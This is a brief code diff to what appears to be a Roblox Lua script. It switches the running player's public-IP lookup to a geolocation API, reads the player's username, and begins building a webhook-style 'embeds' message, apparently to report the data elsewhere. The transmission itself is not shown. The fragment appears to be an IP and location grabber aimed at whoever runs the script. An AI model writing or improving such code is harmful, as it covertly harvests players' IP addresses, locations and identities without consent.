@@ -1,4 +1,4 @@
-local lfv = tostring(game:HttpGet("https://api64.ipify.org", true))
+local lfv = tostring(game:HttpGet("http://ip-api.com/json/", true))
 local lfv2 = game.Players.LocalPlayer.Name
 msg = {
 ["embeds"] = {{
